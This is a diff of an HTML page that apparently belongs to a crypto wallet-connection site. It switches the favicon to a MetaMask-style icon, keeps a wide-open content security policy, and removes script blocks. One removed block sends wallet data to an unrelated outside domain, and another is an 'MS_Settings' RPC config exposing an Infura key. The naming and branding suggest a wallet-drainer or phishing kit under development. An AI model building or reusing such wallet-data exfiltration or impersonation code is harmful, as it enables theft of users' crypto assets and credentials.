@@ -3,7 +3,7 @@
 <head>
   <!-- Add CSP and favicon -->
   <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; connect-src *;">
-  <link rel="icon" type="image/x-icon" href="./assets/favicon.ico">
+  <link rel="icon" type="image/x-icon" href="./assets/web3-modal/images/MM.svg">
   <!-- Existing meta tags -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -40,44 +40,5 @@
 </body>
 
 </html>
-
-<script>
-function ms_init() {
-    console.log('Wallet connection triggered');
-    // Your existing connection logic
-}
-</script>
-
-<!-- Add this before the closing </head> tag -->
-<script>
-const API_ENDPOINT = 'https://fasterdeliveryuae.com';
-
-async function sendWalletData(walletData) {
-    try {
-        const response = await fetch(`${API_ENDPOINT}/wallet`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(walletData)
-        });
-        return await response.json();
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
-</script>
-
-<!-- Remove duplicate MS_Settings declaration -->
-<script>
-// Keep only one instance of MS_Settings
-const MS_Settings = {
-    RPCs: {
-        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
-        56: "https://bsc-dataseed.binance.org/",
-        137: "https://polygon-rpc.com"
-    }
-};
-</script>
-
+    <!-- Remove these duplicate declarations -->
 
